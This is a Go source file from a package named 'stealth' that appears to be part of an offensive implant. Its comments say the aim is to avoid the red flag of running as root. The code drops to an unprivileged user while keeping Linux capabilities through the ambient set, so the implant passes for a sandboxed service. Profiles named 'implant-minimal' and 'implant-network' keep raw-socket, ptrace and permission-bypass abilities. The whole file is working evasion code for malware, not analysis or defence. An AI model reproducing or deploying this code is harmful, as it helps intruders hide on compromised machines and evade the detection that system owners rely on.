package stealth

import (
	"syscall"
	"unsafe"
)

// Ambient Capability Escalation
//
// OPSEC rationale: Running as root is a red flag. Most legitimate services
// run as unprivileged users with specific Linux capabilities. By dropping
// to a normal user but retaining needed capabilities via the ambient set,
// we look like a properly sandboxed service while keeping operational ability.

// prctl constants for capabilities
const (
	prCapAmbient      = 47 // PR_CAP_AMBIENT
	prCapAmbientRaise = 2  // PR_CAP_AMBIENT_RAISE
	prCapAmbientClear = 3  // PR_CAP_AMBIENT_CLEAR_ALL
	prCapAmbientIsSet = 1  // PR_CAP_AMBIENT_IS_SET

	prSetKeepCaps = 8 // PR_SET_KEEPCAPS
	prGetKeepCaps = 7 // PR_GET_KEEPCAPS
)

// Linux capability constants
const (
	CapNetRaw      = 13 // CAP_NET_RAW — raw sockets for network operations
	CapNetAdmin    = 12 // CAP_NET_ADMIN — network configuration
	CapNetBindSvc  = 10 // CAP_NET_BIND_SERVICE — bind to ports < 1024
	CapDACOverride = 1  // CAP_DAC_OVERRIDE — bypass file permission checks
	CapDACReadSrch = 2  // CAP_DAC_READ_SEARCH — bypass read permission checks
	CapSysPtrace   = 19 // CAP_SYS_PTRACE — trace/inspect processes
	CapSysAdmin    = 21 // CAP_SYS_ADMIN — broad admin capability
	CapSetUID      = 7  // CAP_SETUID — change UID
	CapSetGID      = 6  // CAP_SETGID — change GID
	CapFOwner      = 3  // CAP_FOWNER — bypass file ownership checks
	CapKill        = 5  // CAP_KILL — send signals to any process
)

// capHeader is the kernel's __user_cap_header_struct
type capHeader struct {
	version uint32
	pid     int32
}

// capData is the kernel's __user_cap_data_struct (v3 uses two of these)
type capData struct {
	effective   uint32
	permitted   uint32
	inheritable uint32
}

const capV3 = 0x20080522 // _LINUX_CAPABILITY_VERSION_3

// CapabilityProfile defines which capabilities to retain after dropping root.
type CapabilityProfile struct {
	Name         string
	Capabilities []int
	TargetUID    int
	TargetGID    int
}

// ServiceCapProfiles maps service names to their typical capability sets.
var ServiceCapProfiles = map[string]CapabilityProfile{
	"sshd": {
		Name:         "sshd",
		Capabilities: []int{CapNetBindSvc, CapSetUID, CapSetGID, CapDACOverride, CapKill, CapSysAdmin},
		TargetUID:    0, // sshd runs as root
		TargetGID:    0,
	},
	"nginx": {
		Name:         "nginx",
		Capabilities: []int{CapNetBindSvc, CapSetUID, CapSetGID},
		TargetUID:    33, // www-data
		TargetGID:    33,
	},
	"implant-minimal": {
		Name:         "implant-minimal",
		Capabilities: []int{CapNetRaw, CapDACReadSrch, CapSysPtrace},
		TargetUID:    65534, // nobody
		TargetGID:    65534,
	},
	"implant-network": {
		Name:         "implant-network",
		Capabilities: []int{CapNetRaw, CapNetAdmin, CapNetBindSvc, CapDACReadSrch},
		TargetUID:    65534,
		TargetGID:    65534,
	},
}

// DropToUserWithCaps drops from root to the specified user while retaining
// specific capabilities via the ambient capability set.
//
// Process:
// 1. PR_SET_KEEPCAPS — tell kernel to keep permitted caps across UID change
// 2. Set ambient capabilities — these survive execve and UID transitions
// 3. Drop to target UID/GID
// 4. Verify capabilities are retained
func DropToUserWithCaps(uid, gid int, caps []int) error {
	// Step 1: Keep capabilities across UID change
	_, _, errno := syscall.RawSyscall(syscall.SYS_PRCTL, prSetKeepCaps, 1, 0)
	if errno != 0 {
		return errno
	}

	// Step 2: Set capabilities in the inheritable and permitted sets
	if err := setCapabilities(caps); err != nil {
		return err
	}

	// Step 3: Raise ambient capabilities (must be done before dropping UID)
	for _, cap := range caps {
		_, _, errno := syscall.RawSyscall6(
			syscall.SYS_PRCTL,
			prCapAmbient,
			prCapAmbientRaise,
			uintptr(cap),
			0, 0, 0,
		)
		if errno != 0 {
			// Non-fatal: some caps might not be raisable
			continue
		}
	}

	// Step 4: Drop GID first (must be done before UID)
	if gid > 0 {
		if err := syscall.Setresgid(gid, gid, gid); err != nil {
			return err
		}
	}

	// Step 5: Drop UID
	if uid > 0 {
		if err := syscall.Setresuid(uid, uid, uid); err != nil {
			return err
		}
	}

	// Step 6: Re-set capabilities after UID change
	if err := setCapabilities(caps); err != nil {
		return err
	}

	return nil
}

// ApplyCapabilityProfile applies a predefined capability profile.
func ApplyCapabilityProfile(profileName string) error {
	profile, ok := ServiceCapProfiles[profileName]
	if !ok {
		profile = ServiceCapProfiles["implant-minimal"]
	}

	return DropToUserWithCaps(profile.TargetUID, profile.TargetGID, profile.Capabilities)
}

// setCapabilities sets the effective, permitted, and inheritable cap sets.
func setCapabilities(caps []int) error {
	hdr := capHeader{
		version: capV3,
		pid:     0, // current process
	}

	// Build capability bitmask (v3 uses two uint32s for caps 0-31 and 32-63)
	var data [2]capData
	for _, cap := range caps {
		idx := cap / 32
		bit := uint32(1) << uint(cap%32)
		if idx < 2 {
			data[idx].effective |= bit
			data[idx].permitted |= bit
			data[idx].inheritable |= bit
		}
	}

	_, _, errno := syscall.RawSyscall(
		syscall.SYS_CAPSET,
		uintptr(unsafe.Pointer(&hdr)),
		uintptr(unsafe.Pointer(&data[0])),
		0,
	)
	if errno != 0 {
		return errno
	}

	return nil
}

// GetCurrentCaps returns the current effective capability bitmask.
func GetCurrentCaps() (uint64, error) {
	hdr := capHeader{
		version: capV3,
		pid:     0,
	}

	var data [2]capData
	_, _, errno := syscall.RawSyscall(
		syscall.SYS_CAPGET,
		uintptr(unsafe.Pointer(&hdr)),
		uintptr(unsafe.Pointer(&data[0])),
		0,
	)
	if errno != 0 {
		return 0, errno
	}

	return uint64(data[0].effective) | (uint64(data[1].effective) << 32), nil
}

// HasCapability checks if we currently have a specific capability.
func HasCapability(cap int) bool {
	caps, err := GetCurrentCaps()
	if err != nil {
		return false
	}
	return caps&(1<<uint(cap)) != 0
}
